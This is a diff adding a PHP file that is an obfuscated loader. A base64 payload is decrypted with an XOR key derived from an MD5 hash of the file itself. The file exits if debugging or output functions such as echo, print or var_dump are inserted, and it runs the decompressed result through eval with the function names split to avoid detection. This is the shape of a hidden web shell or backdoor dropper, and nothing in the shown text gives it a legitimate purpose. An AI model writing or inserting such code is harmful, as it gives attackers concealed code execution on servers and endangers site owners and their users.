@@ -1,0 +1,24 @@
+<?php
+$dljxlyxhcqpl="1918a0f045e16b1d106a50b7a39cfd14";
+$hfaeyxogdq="055b090005025f09015303570f0607005401040056060652520a0f0704535000";
+$wbpnwlfrxqwm="+Tf5Vv9yKcSgt6xrKcGmXo/0PBEJky7I50JtybQH52Hi4k7vEpATZuYpj+lMEvdS1CIHzBH+paWBisW6rqzmE9HAKRPgJh+f5e6reh9PRw/Jmc6qIcehP5nriqlIgx2DISzCS3W3siKOiOUenm8McHsDVhF6d2r2vm28sr2xAgsUe/n0hEA3QDOxMEot3o0S8qMcGDRBRPKny1kgat1Lrs1Wv3sj5rF0yRhu9JJuuko3p2Y7F4NI97aVzDy7Y0eN+svCmV1LTyxCK6Omc88GARveuvFoCvSsAD90vfYGKUK4MiFEYvPQRiT62E74G/UakiPqLEqhlyZEd+DL4WyDk+Y90lGSrk0pu4JY17iXsU+uVNBdb0xr/2tal7OwmdGFhaA1kkTYQqgLhEMRxQz2+qvnhreQg1qGYrgnMSpCoFex93DRAFVc4sWjO+nExObFXLhFDtHFlicsI98fAt0X7xN8PuUj8G+vgyi/3fKvAYiVOLLsM4QON1XiuOkA759oleYJEb96+rdGHqoDkjUiUWQa6717JmJDeOdJl1DA2V5/XsFIkJ0YnAPqkBGdYnrnbzq5hGJOjuw6kQNKMWFwfHhLy3nVxrhFtEplweQ9mTa/GGOB+nWPhjUzAvS7h39yzlgpf6kMa0ZylTPWA5HDxK3/YqL/2viQm9vRCM65DYzkOOS9OqkywzI07ACzchDuhRZ/jzld/hCNqI7hI/UfpdOfUtZO9NRuVA1sTpyS5bgMnYonPEV8Qez6zhjwM3Yk5O3Lt/sMRtmpdgRuK3v1Zx9PuicYmN2k7wprLucrDpGFROQ7HryLEOH8fN9GX7EfShDfADKBdOs+1ecGPbGSm2gXMqX/g00XqyeWwxQ/XhqaW1PeRPxSFW/gOny/XdpmkqF6MjHmeyqqV4mu+LsJiYegpB5j";
+$ksskyrj=file_get_contents(__FILE__);
+$qerdirw=str_replace($wbpnwlfrxqwm,"",$ksskyrj);
+if(strpos($qerdirw,"ec"."ho")!==false||strpos($qerdirw,"pr"."int")!==false||strpos($qerdirw,"var_"."dump")!==false||strpos($qerdirw,"file_put_"."contents")!==false||strpos($qerdirw,"fw"."rite")!==false){die();}
+$ulvvlf=str_replace(array($dljxlyxhcqpl,$hfaeyxogdq),array("SP_76754a1b","KP_8639f646"),$ksskyrj);
+$qwidpagsw=md5($ulvvlf);
+$jlqpdgmnyk=hex2bin($hfaeyxogdq);
+$fvzjcmlcufcz="";
+$ojpdjwngq=strlen($qwidpagsw);
+for($taqzazbkp=0;$taqzazbkp<$ojpdjwngq;$taqzazbkp++){
+    $fvzjcmlcufcz.=chr(ord($jlqpdgmnyk[$taqzazbkp])^ord($qwidpagsw[$taqzazbkp]));
+}
+$seyqtbbb=base64_decode($wbpnwlfrxqwm);
+$wmrjtdlfn=strlen($seyqtbbb);
+$gpewlqg="";
+$czsxyxlomltj=strlen($fvzjcmlcufcz);
+for($taqzazbkp=0;$taqzazbkp<$wmrjtdlfn;$taqzazbkp++){
+    $gpewlqg.=$seyqtbbb[$taqzazbkp]^$fvzjcmlcufcz[$taqzazbkp%$czsxyxlomltj];
+}
+$gqojitljv="gz"."in"."fl"."ate";
+eval($gqojitljv($gpewlqg));
